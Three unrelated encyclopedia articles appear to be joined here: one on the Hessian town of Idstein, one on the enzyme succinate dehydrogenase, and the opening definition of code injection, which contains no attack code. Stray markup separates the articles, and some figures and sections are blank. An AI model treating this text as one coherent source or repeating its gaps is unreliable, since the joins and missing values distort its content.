<text>Idstein () is a town of about 25,000 inhabitants in the Rheingau-Taunus-Kreis in the &quot;Regierungsbezirk&quot; of Darmstadt in Hesse, Germany. Because of its well preserved historical Altstadt (Old Town) it is part of the &quot;Deutsche Fachwerkstraße&quot; (German Timber-Frame Road), connecting towns with fine fachwerk buildings and houses. In 2002, the town hosted the 42nd Hessentag state festival.

==Geography==

===Location===
Idstein lies in the Taunus mountain range, about north of Wiesbaden. The town&#x27;s landmark is the &quot;Hexenturm&quot; (Witches&#x27; Tower), a 12th-century bergfried and part of Idstein Castle.

The Old Town is found between the two brooks running through town, the Wolfsbach in the east and the Wörsbach in the west, on a high ridge reaching up to above sea level. This comes to an end in the Old Town&#x27;s north end with the castle and palace crags, behind which the two brooks run together. On the Wolfsbach, remnants of the like-named, now forsaken village can still be made out. The estate agent Gassenbach in the town&#x27;s south goes back to an old settlement called Gassenbach; for the last few years, it has belonged to the &quot;Domäne Mechtildshausen&quot;, an organic farming operation.

West of town, beyond the Wörsbach valley, lies another high ridge with peaks ranging from the Hohe Kanzel () to the Roßberg () and the Rügert () to the Rosenkippel (); to the south, the Galgenberg () forms another high area over to the Dasbach Heath. Just under the western heights run the Autobahn A 3 and the Cologne-Frankfurt high-speed rail line (in the Idsteintunnel along the slope).

On the other side of the Rügert are the constituent communities of Oberauroff and Niederauroff in the valley of the Auroffer Bach.

North of Idstein, the Wörsbach valley reaches into the &quot;Goldener Grund&quot;, fertile cropland that stretches all the way to the Lahn valley.

===Neighbouring communities===
Idstein borders in the north on the town of Bad Camberg (Limburg-Weilburg) and the community of Waldems (Rheingau-Taunus-Kreis), in the east on the community of Glashütten (Hochtaunuskreis), in the southeast on the town of Eppstein (Main-Taunus-Kreis), in the south on the community of Niedernhausen, in the southwest on the town of Taunusstein and in the west on the community of Hünstetten (all three in the Rheingau-Taunus-Kreis).

===Constituent communities===
The town is made up of a main town bearing the same name as the whole and eleven other, formerly independent villages:


Until 1977, Idstein belonged to the Untertaunuskreis (district seat, Bad Schwalbach), which in the course of district reform was merged with the Rheingau-Kreis into the new Rheingau-Taunus-Kreis. With about 25,700 inhabitants, Idstein is the second biggest town in the district (after Taunusstein).

==History==
Idstein, which had its first documentary mention in 1102 as &quot;Etichenstein&quot;, was granted town and market rights in 1287 by King Rudolph of Habsburg. Besides the above-mentioned &quot;Hexenturm&quot; near the old Nassau castle, the town has a mediaeval town centre with many timber-frame buildings. The town&#x27;s oldest preserved house was originally built in 1410.

From the documentary mention in 1102 until 1721, Idstein was, with interruptions, residence of the Counts of Nassau-Idstein and other Nassau lines. One of the Counts, Adolf of Germany, was, as a compromise candidate, the Holy Roman Emperor from 1292 to 1298, later falling in battle against the anti-king Albrecht I of Habsburg.

The Nassau Counts&#x27; holdings were subdivided many times among heirs, with the parts being brought together again whenever a line died out. This yielded an older Nassau-Idstein line from 1480 to 1509, later merging once again with Nassau-Wiesbaden and Nassau-Weilburg and, from 1629 to 1721, a newer Nassau-Idstein line.
In the 17th century, Count Johann of Nassau-Idstein persecuted witches in Idstein.

In 1721, Idstein passed to Nassau-Ottweiler, and in 1728 to Nassau-Usingen, thereby losing its status as a residence town, although it became the seat of the Nassau Archives and of an &quot;Oberamt&quot;.

Nassau-Usingen was united with Nassau-Weilburg in 1806 into the Duchy of Nassau, becoming a member of the Confederation of the Rhine. After the Austro-Prussian War in 1866, Prussia annexed the Duchy as the Prussian province of Hesse-Nassau.

The residential palace from the 17th century is used by the &quot;Pestalozzischule&quot; as a school building. It was expanded with a new building below the palace.

From the late 18th century to the mid 20th, Idstein was the centre of an important leather industry. During the Second World War, many women became forced labour for work in the tanneries. In 1959, the dominant tannery in the middle of the town core was shut down for economic reasons. The lands right at the edge of the Old Town lay empty and were used until the 1980s as a carpark. Today, new shops and apartments surround the Löherplatz, which is now a marketplace.
The private &quot;Kalmenhof&quot; clinic in Idstein was drawn into the Nazi Euthanasia programme. Under Action T4, the Kalmenhof served as a way station for Hadamar killing centre. After the gassings at Hadamar came to an end in the face of public protests, especially from the churches, the Kalmenhof itself, in the course of &quot;Aktion Brandt&quot;, became a killing institute; patients here were murdered with poison injections.

Shortly after the war, reports of young wards being mishandled came to light.

Eleven formerly independent villages were merged as of 1971 into Idstein, under the framework of municipal reform.

==Population development==


==Politics==

===Coat of arms===
The town&#x27;s arms might be described thus: Azure a round castle wall embattled with two portcullises open, the wall enclosing two towers, the whole Or, with peaked roofs gules, between the portcullises an inescutcheon azure with a lion rampant Or armed and langued gules among six billets Or.

The inescutcheon is the arms borne by the House of Nassau. The town&#x27;s flag also bears this design set against orange and blue, Nassau&#x27;s colours.

==Twin towns – sister cities==

Idstein is twinned with:

* Heusden, Netherlands
* Lana, Italy
* Şile, Turkey
* Uglich, Russia
* Zwijndrecht, Belgium
==Economy and infrastructure==

===Transport===
Idstein has an interchange on the Autobahn A 3 north of Wiesbaden between Niedernhausen and Bad Camberg, and a railway station with direct connections to Limburg an der Lahn, Frankfurt am Main and Wiesbaden.

The building of a bypass, &quot;Bundesstraße&quot; 275, lessened the traffic in the historic Old Town. However, the traffic volume in the town core is still very high.

At intersections in the town core, roundabouts have improved the traffic flow, in some places noticeably. The &quot;Südtangente&quot; (south &quot;tangent&quot; road), which had been planned since 1981, was completed in 2009, reducing traffic in town further. It links two new development areas. Of the €9,000,000 for the project, roughly 60% was borne by the state of Hesse.

===Local transport===
Within Idstein town limits are two railway stations on the Main-Lahn Railway (&quot;Main-Lahn-Bahn&quot;), Idstein and Wörsdorf. Hourly trains serving the Frankfurt/Wiesbaden–Niedernhausen–Limburg line run into the evening. In Niedernhausen there is also a transfer point with S-Bahn line S2 towards Dietzenbach through the Frankfurt and Offenbach S-Bahn tunnels.

The Idstein town bus (&quot;de Idstaaner&quot;) serves 3 lines:
*221 Railway station–Eisenbach–Taubenberg–Gänsberg–ZOB Schulgasse–Railway station (formerly 401)
*222 Railway station–ZOB Schulgasse–Gänsberg–Taubenberg–Eisenbach–Railway station (formerly 402)
*223 (booster line) Railway station–Dasbach–Heftrich–Niederrod (formerly 403)

The town bus is run by ORN (&quot;Omnibusverkehr Rhein-Nahe&quot;). It uses mainly Midi low-floor buses built by MAN. Most journeys made by bus 223 are arranged in response to demand.

Moreover, many regional buses also serve Idstein, linking important areas not served by the town bus as they go.
*220 Idstein–Niedernhausen–Oberjosbach (formerly 5460)
*224 Idstein–Ehrenbach–Görsroth–Idstein
*225 Railway station–ZOB–Nassauviertel–Hünstetten–Neuhof–(Wiesbaden)
*226 Railway station–ZOB–Nassauviertel–Wallrabenstein–Ketternschwalbach (formerly 103)
*227 Görsroth–Idstein
*230 Idstein–Esch–Bad Camberg (formerly 5465)
*233 Idstein/Bad Camberg–Esch–Wüstems
*239 Idstein–Waldems
*271 ZOB–Railway station–Am Wörtzgarten–Neuhof–Platte–Wiesbaden main railway station (formerly 5461)

Since timetable changes in July 2007, many journeys, particularly on weekends or in the evening, have been served by demand-responsive buses.

Bus services in the countryside around Idstein (the &quot;Idsteiner Land&quot;) are likewise run by ORN, which contracts the work out to companies such as Omnibus Mester from Eppstein-Bremthal, Omnibus Weber, Paul-Reisen or Wahl-Reisen (all from Hünstetten).

===Established businesses===
Roughly 200 small and midsize businesses, mainly in crafts and retail sales, characterize Idstein&#x27;s business life; four out of every five have fewer than ten employees.

Among the bigger businesses in town are, for instance, Motorola Solutions Germany GmbH, Serviceware SE, Jack Wolfskin, DG-Verlag (distribution and logistics), ERNST SCHMITZ Logistics &amp; Technical Services GmbH, Black &amp; Decker Deutschland GmbH, INGENIUMDESIGN, Hochschule Fresenius gGmbH, Lebensmittelmärkte Uwe Georg e.K. and Titleist.

Another important employer and factor in the economy is the &quot;Landeswohlfahrtsverband Hessen&quot; (Hesse State Welfare Federation) with its SPZ (paediatric centre) Kalmenhof, an institution aiding youths and people with handicaps.

As an historically important and modern middle centre and the heart of the &quot;Idsteiner Land&quot;, Idstein has at its disposal a multi-faceted retail structure. Its location on the Frankfurt/Wiesbaden – Limburg railway and the A 3 and a great number of commuters put the great shopping centres in Limburg an der Lahn and Wiesbaden as well as those throughout the Frankfurt Rhine Main Region in direct competition with the local retailers.

===Major building projects===
In the course of the 2002 Hessentag, many great building (and sometimes conversion) projects were undertaken. The building of the connecting road &quot;Tiergartenspange&quot; reduced traffic in the Old Town.

Three new building areas have been developed:
*Nassau-Viertel (mixed-use area in the town&#x27;s northwest along &quot;Bundesstraße&quot; 275)
*South bypass road
*Taunusviertel (in the town&#x27;s southeast)

====Major building projects since &quot;Hessentag&quot;====
*New building work on the &quot;Grundschule Auf der Au&quot; (primary school) and the &quot;Erich-Kästner-Schule&quot; (completed 2005)
*New building work on the police station (inner town, completed 2006) in connection with conversion work on the &quot;Amtsgericht&quot; (court, still in progress)
*New building work on the Campus Europa Hochschule Fresenius (college in the inner town, under construction)
*New building work on the Tournesol-Allwetterbad (swimming pool) with biomass power station in the Nassau-Viertel
*New building work on the health centre/hospital
*&quot;Kappus-Anlage&quot; (at the &quot;railway station roundabout&quot;): doctors&#x27; centre and discount market (completed 2008)
*Ramp onto the A 3 from &quot;Bundesstraße&quot; 275 towards Frankfurt (completed: April 2008)

===Public institutions===
* Idstein Protestant parish
* Idstein St. Martin Catholic parish
* Idstein volunteer fire brigade
* Idstein youth centre

===State institutions===
* &quot;Amtsgericht&quot; (court)
* Technisches Hilfswerk (THW)
* &quot;Sozialpädagogisches Zentrum Kalmenhof&quot; (State Welfare Federation institution)

===Education===
* Taubenbergschule (primary school)
* Alteburgschule Heftrich (primary school)
* Franz-Kade-Schule (Wörsdorf primary school)
* Limesschule (cooperative comprehensive school with Hauptschule and Realschule branches)
* Grundschule Auf der Au (primary school)
* Erich Kästner-Schule (school for those in need of learning help)
* Pestalozzischule (Gymnasium)
* Hochschule Fresenius (college)
* Volkshochschule Rheingau-Taunus (folk high school)

===Hospital===
In 2008, the hospital moved into a new €22,000,000, 90-bed building on an plot on Robert-Koch-Straße. The state provided a subsidy of €17,200,000 (earlier, €3,000,000 came from the district, which had forgone part of the buying price for the former district hospitals at Idstein und Bad Schwalbach).

===Swimming pool===
A partly prefabricated all-weather pool came into being (after some delays) in spring 2010 in the Nassau-Viertel for €19,000,000. The town is subsidizing the more than €2,500,000 plot on &quot;Bundesstraße&quot; 275 and the yearly €500,000 operating costs. For the manufacturer, it is, with its cupola, biomass power plant and natural bathing pond a demonstration project near Frankfurt Airport.

==Culture and sightseeing==

===Buildings===

====Unionskirche====

The &quot;Unionskirche&quot;, whose outer appearance is quite plain, holds within its splendour. The building history of the church, originally consecrated to Saint Martin of Tours as a monastery church, reaches back to the 13th century. In the mid 14th century a new building in the Gothic style arose, which was remodeled in the 17th century.
In 1553 Idstein turned Lutheran. The church was decorated in Baroque style in the 17th century, unusually rich for a Protestant church. The ceiling in the main nave was thoroughly covered with large-scale oil paintings from the Dutch school of Rubens. Several well known works by Rubens form the basis of scenes from the life of Christ on the walls and ceiling; for example &quot;The Wedding at Cana&quot; on the south wall is largely based on Rubens&#x27;s painting &quot;The Feast of Herod&quot; which hangs today in the National Gallery of Scotland in Edinburgh.

The church&#x27;s name refers to the church union declared in Idstein in 1817 whereby the Reformed and Lutheran churches in the Duchy of Nassau united to the Protestant Church in Nassau, today the Protestant Church in Hesse and Nassau.

====Residence palace====

The Renaissance-style &quot;Schloss&quot; was built in 1614–1634 by Jost and Henrich Heer (Höer) for Count Ludwig (d. 1627) and his son Count Johann (d. 1677) by incorporating older building materials. It stands on a craggy massif between the town&#x27;s two brooks. It is believed that the crags on which the palace is built were already built up in the 11th century.

A bridged gap in the crags separates it from the old castle area from the 11th century; through this gap today runs an important road.

During the time when the last Idstein prince, Georg August Samuel von Nassau-Idstein (1665–1721), was ruling, the building was given its interior design under Maximilian von Welsch&#x27;s guidance. The now partly missing ceiling stucco was done by Carlo Maria Pozzi. At the main entrance door is a great alliance coat of arms of Count Johann and his consort from about 1635.

The palace has been home to the &quot;Pestalozzischule&quot; since 1946 and may be visited on guided tours.
====Castle and &quot;Hexenturm&quot;====

The castle in the area stretching from the gateway arch building on the town side to the bridge over to the &quot;Schloss&quot; arose between 1497 and 1588. With the remodelling done on the palace itself in the 17th century, this area also underwent far-reaching changes, partly losing its defensive functions, which, it is worth noting, were no longer up to date anyway.

The castle&#x27;s keep, known as the &quot;Hexenturm&quot;, tall, walls more than thick, even given overall diameter of just under , is Idstein&#x27;s oldest building. Dendrochronological borings show that work began on the tower as early as 1170 (not, as had long been assumed, about 1350). It received its &quot;butter churn&quot; shape, built in stages, about 1500. (Building researchers see in it a rare time capsule, because in the 20th century, almost nothing was changed beyond the last work in 1963, which entailed nothing more than some new plastering outside and small touch-ups with cement inside).

No witches or warlocks were ever imprisoned in the &quot;Hexenturm&quot;. However, on a cliff wall at the foot of the keep, a plaque has been placed in memory of those murdered after being accused of witchcraft. Idstein was notorious for its witch trials about 1676.
====Other historic buildings====

The old town core is small. It is distinguished by a many timber-frame buildings, some opulently painted and decorated, in which the Rhenish influences on the Hessian-Franconian timber-frame building style can already be seen. Therefore, Idstein is part of the German Framework Road. The town core stretches between the castle area with its &quot;Hexenturm&quot; and the &quot;Höerhof&quot;, the representative timber-frame building built in 1620–1626 by the palace building master on the heights across from the &quot;Schloss&quot;. The painter Ernst Toepfer bought the property in 1911 and restored the building. Today, the &quot;Höerhof&quot; is a stylish hotel and restaurant with an idyllic inner courtyard.

Right at the Nassau castle&#x27;s gateway arch building, standing over König-Adolf-Platz, is the Town Hall (&quot;Rathaus&quot;) from 1698, in a rather odd way over the passage that separates the Old Town from the castle. Also worth mentioning is the carillon (&quot;Glockenspiel&quot;). A rockslide from the crags destroyed the Town Hall in 1928, but it was rebuilt between 1932 and 1934.

König-Adolf-Platz is seamlessly ringed by representative timber-frame houses, mainly dating from about 1600. To the Town Hall&#x27;s left stands the &quot;Schiefes Haus&quot; (&quot;Crooked House&quot;), which was renovated a few years ago, and which Nicolay, the major of the town militia, had built in 1527. On the way out of the square towards the &quot;Unionskirche&quot;, is the richly adorned &quot;Killingerhaus&quot; built in 1527, which has served as a museum and tourism office since 1987. It is one of Germany&#x27;s most important timber-frame houses with regards to art history. According to one story, the building was originally built in Strasbourg, and when the owner moved to Idstein, he brought the house with him.

The rest of the old downtown core is also characterized by its many timber-frame houses and estate complexes from the 16th and 17th centuries, some of which have been lavishly renovated. This is particularly so along the Obergasse (&quot;Upper Lane&quot;), which leads from König-Adolf-Platz out of the town and meets the old town wall on the Höerhof heights. Somewhat below that stands the &quot;Stockheimer Hof&quot;, which was built in the late 16th century as the seat of the Lords of Stockheim. After they died out, ownership passed to the family von Calm between 1768 and 1776, giving the property on which it stands its current name, Kalmenhof. Until 2005, the timber-frame building was being used by the &quot;Sozialpädagogisches Zentrum SPZ Kalmenhof&quot;. On the way from the &quot;Killingerhaus&quot; to the &quot;Höerhof&quot;, one house has a humorous Dog Latin inscription. &quot;Sita vsvilate inis taberce inis&quot; (which is actually a misspelling of &quot;Sieht aus wie Latein, ist aber keines&quot; – &quot;Looks like Latin, but is not&quot;).

As a last witness to the former leather industry, the &quot;Gerberhaus&quot; (&quot;Tanners&#x27; House&quot;) stands at Löherplatz below the &quot;Unionskirche&quot;; it is the former storage shed on the Wörsbach. Löherplatz was, beginning in the Middle Ages the place where the tanneries and leather processing works were found owing to the demand for water, and also the need to have the works outside town given the attendant stench that went forth from them. The &quot;Gerberhaus&quot;, after a thorough renovation, nowadays serves as an exhibition and cabaret event venue.

Stretching east of the old town core from the marketplace, which itself dates from about 1700, is a Baroque town expansion. Its streets match the ideals of town building at that time with right-angled intersections, the timber-frame houses lining them pragmatic and far less decorated than in the town core. Building &quot;sins&quot; and great changes have been avoided, and instead, restoration is what was more often done, thereby preserving an impressive, unbroken ensemble of these buildings.

====St. Martin====
As the former neogothic Catholic parish church St. Magdalena was too small for a growing population after World War II, a new church St. Martin was built instead, designed by the architect Johannes Krahn, resembling a Roman basilica with open sandstone walls and a band of windows below the ceiling, consecrated in 1964. In 2006 a new organ was installed by Orgelbau Mebold.

===Limes===

The municipal area was crossed by the Limes Germanicus, a line of frontier forts begun in AD 86 by the Romans which stretched from near Bonn on the Rhine to near Regensburg on the Danube. It divided the Roman Empire from the unconquered Germanic tribes. The area of the town that stands today lay on the Germanic side. Bearing obvious witness to the Limes is a replica of a watchtower towards Niedernhausen near Dasbach on the Dasbacher Höhe (heights). Even the Dasbach churchtower supposedly stands on the foundation of a Roman watchtower. Within the limits of neighbouring Taunusstein is likewise found such a replica near Orlen, right beside the remains of the castrum &quot;Zugmantel&quot;.

Near the outlying centre of Heftrich stood the castrum &quot;Alteburg&quot;, of which, however, nothing more is to be seen.

On 15 July 2005, the Upper-Germanic-Rhaetian Limes (the Limes Germanicus) was raised to World Heritage Site by UNESCO.

=== War cemetery ===

During the Second World War there were two reserve hospitals in Idstein – one in the castle and one in the Kalmenhof. When, towards the end of the war, it was no longer possible to transfer people who had died in the hospital to their hometowns, they were buried in the Idstein cemetery. After the end of the war, the Volksbund Deutsche Kriegsgräberfürsorge built a central memorial in Idstein, where all war dead from the district of Untertaunus were to be reburied.

There are a total of 250 graves on the Idstein war cemetery. Of those buried there, 234 people are known by name. 10 dead are civilians. There are also six graves with fallen soldiers and Russian prisoners of war from the First World War. Most of the dead at the Idstein war cemetery died after the fighting ended. There is evidence that prisoners from the Rhine meadow camps (&quot;Rheinwiesenlager&quot;) came to the Idstein military hospitals.

===Regular events===
As a yearly event highlight, the &quot;Hessen-Jazz Festival&quot; or more recently &quot;Idstein JazzFestival&quot; has been drawing thousands of visitors for 20 years into the Old Town&#x27;s laneways. On three days, during the first weekend in the Hesse summer holidays, up to 75 different jazz groups on a dozen stages play from Friday evening to Sunday live in an open-air concert.

The Unionskirche is the location for choral concerts of the Idsteiner Kantorei conducted by Carsten Koch twice a year, such as Orff&#x27;s &quot;Carmina Burana&quot; and Bach&#x27;s &quot;Weihnachtsoratorium&quot; in 2009. For the annual European Heritage Days the &quot;Nassauische Kammerphilharmonie&quot; has performed a Sinfoniekonzert on the occasion of the Tag des offenen Denkmals, including a series of Beethoven&#x27;s symphonies. The Rheingau Musik Festival staged concerts here with Elizabeth Parcells, Chanticleer and ensemble amarcord, among others.

In the church St. Martin an annual choral concert is performed by the combined choirs Chor St. Martin and the chamber choir Martinis, conducted by Franz Fink, such as Bach&#x27;s &quot;St Matthew Passion&quot; in 1998 with Elisabeth Scholl, Andreas Scholl and Max van Egmond and again in 2009 with Andreas Pruys and Klaus Mertens. The concert of 2011 was Handel&#x27;s &quot;Messiah&quot;, with soloists Katia Plaschka, Andreas Scholl, Ulrich Cordes and Markus Flaig. Other concerts in the church have included music of Graham Waterhouse, the duo propram of Giora Feidman and organist Matthias Eisenberg in 2008 and a concert of Kalevi Kiviniemi in 2010.

Although the town of Idstein hosts only a small vineyard, whose wines are not for sale but poured at special occasions, there is nonetheless a yearly wine festival, mainly presenting wines from the near Rheingau.

Every other year, in the spring, the &quot;Idsteiner Hexenmarkt&quot; (Witches&#x27; Market) is held in the castle and palace area, an event with medieval crafts and entertainment.

In the summer, from June to August on the third day of each of those months, the &quot;Alteburger Markt&quot; is held in Idstein-Heftrich, on the site of the Roman castrum Alteburg.

The youth centre in Idstein offers a monthly event plan with hip hop, metal, DJ night and punk rock, offering at irregular intervals, for instance live concerts by local bands.

Since 2003, the &quot;Monkey Jump Festival&quot; has been held annually. A great number of bands perform in the town&#x27;s various pubs and restaurants during the festival.

Since 2004, the Idstein Women&#x27;s Day &quot;Frauen in Balance&quot; (&quot;Women in Balance&quot;) has been held annually at the &quot;Gerberhaus&quot;, in collaboration with the Rheingau-Taunus-Kreis equality commissioner.

<text>Succinate dehydrogenase (SDH) or succinate-coenzyme Q reductase (SQR) or respiratory complex II is an enzyme complex, found in many bacterial cells and in the inner mitochondrial membrane of eukaryotes. It is the only enzyme that participates in both the citric acid cycle and oxidative phosphorylation. Histochemical analysis showing high succinate dehydrogenase in muscle demonstrates high mitochondrial content and high oxidative potential.

In step 6 of the citric acid cycle, SQR catalyzes the oxidation of succinate to fumarate with the reduction of ubiquinone to ubiquinol. This occurs in the inner mitochondrial membrane by coupling the two reactions together.

== Structure ==
=== Subunits ===

Mitochondrial and many bacterial SQRs are composed of four structurally different subunits: two hydrophilic and two hydrophobic. The first two subunits, a flavoprotein (SDHA) and an iron-sulfur protein (SDHB), form a hydrophilic head where enzymatic activity of the complex takes place. SDHA contains a covalently attached flavin adenine dinucleotide (FAD) cofactor and the succinate binding site and SDHB contains three iron-sulfur clusters: [2Fe-2S], [4Fe-4S], and [3Fe-4S]. The second two subunits are hydrophobic membrane anchor subunits, SDHC and SDHD. Human mitochondria contain two distinct isoforms of SDHA (Fp subunits type I and type II), these isoforms are also found in &quot;Ascaris suum&quot; and &quot;Caenorhabditis elegans&quot;. The subunits form a membrane-bound cytochrome b complex with six transmembrane helices containing one heme b group and a ubiquinone-binding site. Two phospholipid molecules, one cardiolipin and one phosphatidylethanolamine, are also found in the SDHC and SDHD subunits (not shown in the image). They serve to occupy the hydrophobic space below the heme b. These subunits are displayed in the attached image. SDHA is green, SDHB is teal, SDHC is fuchsia, and SDHD is yellow. Around SDHC and SDHD is a phospholipid membrane with the intermembrane space at the top of the image.

==== Table of subunit composition ====

=== Ubiquinone binding site ===

Two distinctive ubiquinone binding sites can be recognized on mammalian SDH – matrix-proximal QP and matrix-distal QD. Ubiquinone binding site Qp, which shows higher affinity to ubiquinone, is located in a gap composed of SDHB, SDHC, and SDHD. Ubiquinone is stabilized by the side chains of His207 of subunit B, Ser27 and Arg31 of subunit C, and Tyr83 of subunit D. The quinone ring is surrounded by Ile28 of subunit C and Pro160 of subunit B. These residues, along with Il209, Trp163, and Trp164 of subunit B, and Ser27 (C atom) of subunit C, form the hydrophobic environment of the quinone-binding pocket Qp. In contrast, ubiquinone binding site QD, which lies closer to inter-membrane space, is composed of SDHD only and has lower affinity to ubiquinone.

=== Succinate binding site ===

SDHA provides the binding site for the oxidation of succinate. The side chains Thr254, His354, and Arg399 of subunit A stabilize the molecule while FAD oxidizes and carries the electrons to the first of the iron-sulfur clusters, [2Fe-2S]. This can be seen in image 5.

=== Redox centers ===

The succinate-binding site and ubiquinone-binding site are connected by a chain of redox centers including FAD and the iron-sulfur clusters. This chain extends over 40 Å through the enzyme monomer. All edge-to-edge distances between the centers are less than the suggested 14 Å limit for physiological electron transfer. This electron transfer is demonstrated in image 8.

== Assembly and maturation ==
All subunits of human mitochondrial SDH are nuclear encoded. After translation, SDHA subunit is translocated as apoprotein into the mitochondrial matrix. Subsequently, one of the first steps is covalent attachment of the FAD cofactor (covalent flavinylation). This process is enhanced by succinate dehydrogenase assembly factor 2 (SDHAF2; also called SDH5 in yeast and SDHE in bacteria) and by some of the Krebs cycle intermediates. Fumarate most strongly stimulates covalent flavinylation of SDHA. Through studies of the bacterial system, the mechanism of FAD attachment has been shown to involve a quinone:methide intermediate. In mitochondrial, but not bacterial, assembly, SDHA interacts with a second assembly factor called succinate dehydrogenase assembly factor 4 (SDHAF4; called SDH8 in yeast) before it is inserted into the final complex.

Fe-S prosthetic groups of the subunit SDHB are being preformed in the mitochondrial matrix by protein complex ISU. The complex is also thought to be capable of inserting the iron-sulphur clusters in SDHB during its maturation. The studies suggest that Fe-S cluster insertion precedes SDHA-SDHB dimer forming. Such incorporation requires reduction of cysteine residues within active site of SDHB. Both reduced cysteine residues and already incorporated Fe-S clusters are highly susceptible to ROS damage. Two more SDH assembly factors, SDHAF1 (SDH6) and SDHAF3 (SDH7 in yeast), seem to be involved in SDHB maturation in way of protecting the subunit or dimer SDHA-SDHB from Fe-S cluster damage caused by ROS.

Assembly of the hydrophobic anchor consisting of subunits SDHC and SDHD remains unclear. Especially in case of heme b insertion and even its function. Heme b prosthetic group does not appear to be part of electron transporting pathway within the complex II. The cofactor rather maintains the anchor stability.

== Mechanism ==

=== Succinate oxidation ===

Much is known about the succinate oxidation mechanism, which involves the transfer of a proton and a hydride. A combination of mutagenesis and structural analysis identifies Arg-286 of the SDHA subunit (&quot;E. coli&quot; numbering) as the proton shuttle. Crystal structures of the enzymes from multiple organisms shows that this is well poised for the proton transfer step. Thereafter, there are two possible elimination mechanisms: E2 or E1cb. In the E2 elimination, the mechanism is concerted. The basic residue or cofactor deprotonates the alpha carbon, and FAD accepts the hydride from the beta carbon, oxidizing the bound succinate to fumarate—refer to image 6. In E1cb, an enolate intermediate is formed, shown in image 7, before FAD accepts the hydride. Further research is required to determine which elimination mechanism succinate undergoes in Succinate Dehydrogenase. Oxidized fumarate, now loosely bound to the active site, is free to exit the protein.

=== Electron tunneling ===

After the electrons are derived from succinate oxidation via FAD, they tunnel along the [Fe-S] relay until they reach the [3Fe-4S] cluster. These electrons are subsequently transferred to an awaiting ubiquinone molecule within the active site. The Iron-Sulfur electron tunneling system is shown in image 9.

=== Ubiquinone reduction ===


The O1 carbonyl oxygen of ubiquinone is oriented at the active site (image 4) by hydrogen bond interactions with Tyr83 of subunit D. The presence of electrons in the [3Fe-4S] iron sulphur cluster induces the movement of ubiquinone into a second orientation. This facilitates a second hydrogen bond interaction between the O4 carbonyl group of ubiquinone and Ser27 of subunit C. Following the first single electron reduction step, a semiquinone radical species is formed. The second electron arrives from the [3Fe-4S] cluster to provide full reduction of the ubiquinone to ubiquinol. This mechanism of the ubiquinone reduction is shown in image 8.

=== Heme prosthetic group ===

Although the functionality of the heme in succinate dehydrogenase is still being researched, some studies have asserted that the first electron delivered to ubiquinone via [3Fe-4S] may tunnel back and forth between the heme and the ubiquinone intermediate. In this way, the heme cofactor acts as an electron sink. Its role is to prevent the interaction of the intermediate with molecular oxygen to produce reactive oxygen species (ROS). The heme group, relative to ubiquinone, is shown in image 4.

It has also been proposed that a gating mechanism may be in place to prevent the electrons from tunneling directly to the heme from the [3Fe-4S] cluster. A potential candidate is residue His207, which lies directly between the cluster and the heme. His207 of subunit B is in direct proximity to the [3Fe-4S] cluster, the bound ubiquinone, and the heme; and could modulate electron flow between these redox centers.

=== Proton transfer ===

To fully reduce the quinone in SQR, two electrons as well as two protons are needed. It has been argued that a water molecule (HOH39) arrives at the active site and is coordinated by His207 of subunit B, Arg31 of subunit C, and Asp82 of subunit D. The semiquinone species is protonated by protons delivered from HOH39, completing the ubiquinone reduction to ubiquinol. His207 and Asp82 most likely facilitate this process. Other studies claim that Tyr83 of subunit D is coordinated to a nearby histidine as well as the O1 carbonyl oxygen of ubiquinone. The histidine residue decreases the pKa of tyrosine, making it more suitable to donate its proton to the reduced ubiquinone intermediate.

== Inhibitors ==

There are two distinct classes of inhibitors (SDHIs) of complex II: those that bind in the succinate pocket and those that bind in the ubiquinone pocket. Ubiquinone type inhibitors include carboxin and thenoyltrifluoroacetone. Succinate-analogue inhibitors include the synthetic compound malonate as well as the TCA cycle intermediates, malate and oxaloacetate. Indeed, oxaloacetate is one of the most potent inhibitors of Complex II. Why a common TCA cycle intermediate would inhibit Complex II is not entirely understood, though it may exert a protective role in minimizing reverse-electron transfer mediated production of superoxide by Complex I. Atpenin 5a are highly potent Complex II inhibitors mimicking ubiquinone binding.

Ubiquinone type inhibitors have been used as fungicides in agriculture since the 1960s. Carboxin was mainly used to control disease caused by basidiomycetes such as stem rusts and &quot;Rhizoctonia&quot; diseases. In the 1980s simple benzanilides were found to have comparable activity to carboxin and a number of these were marketed, including benodanil, flutolanil and mepronil. More recently, other compounds with a broader spectrum against a range of plant pathogens have been developed including boscalid, fluopyram, fluxapyroxad, pydiflumetofen and sedaxane. Some agriculturally important fungi are not sensitive towards members of the new generation of ubiquinone type inhibitors. FRAC has a working group for SDHIs and recommends resistance management practices.

Complex II inhibitors are also used as insecticides and acaricides, in IRAC group 25.

== Role in disease ==

The fundamental role of succinate-coenzyme Q reductase in both oxidative phosphorylation and the citric acid cycle makes it vital in all eukaryotic organisms. Loss of function of SDH via mutations or through toxins can cause a wide range of disease.

When SDH is dysfunctional in the citric acid cycle, it can lead to a buildup of the oncometabolite succinate, which can lead to tumorogenesis. This is well-known to occur in chromaffin cells, causing neuroendocrine tumors such as paraganglioma, renal carcinoma, and Gastrointestinal stromal tumor (GISTs). The penetrance data for SDH mutations causing tumorigenesis is lacking, and international guidelines suggest thorough screening for any carriers. The penetrance of paraganglioma in loss of function mutations of SDH is incomplete and varies by subunit. SDHB mutations have a penetrance between 8% and 37%, SDHD mutations have a penetrance between 38% and 64% with some maternal imprinting effects, and the penetrance for both SDHA and SDHC mutations are poorly studied, but likely between 1% and 30%. Mammalian SDH functions not only in energy generation, but also has a role in oxygen sensing. Buildup of succinate due to defective SDH can cause a pseudo-hypoxia and angiogenesis, both of which contribute to the distinctly vascular and characteristic &quot;salt and pepper&quot; appearance of paraganglioma on imaging. 

Bi-Allelic loss of function mutations of SDHA, SDHB, SDHD, and SDHAF1 or monoallelic loss of function mutations of SDHA can cause Mitochondrial complex II deficiency. This disruption in oxidative phosphorylation can lead to Leigh syndrome, mitochondrial encephalopathy, optic atrophy, myopathy, and a spectrum of disease. These presentations can range from death within the first year of life or in utero to mild symptoms beginning as an adult.

Reduced levels SDH are observed post mortem in the brains of patients with Huntington&#x27;s disease, and energy metabolism defects have been identified in both presymptomatic and symptomatic HD patients.

<doc id="1065470" wikidata="Q2920753" url="?curid=1065470" title="Code injection">
<text>Code injection is a computer security exploit where a program fails to correctly process external data, such as user input, causing it to interpret the data as executable commands. An attacker using this method &quot;injects&quot; code into the program while it is running. Successful exploitation of a code injection vulnerability can result in data breaches, access to restricted or critical computer systems, and the spread of malware.

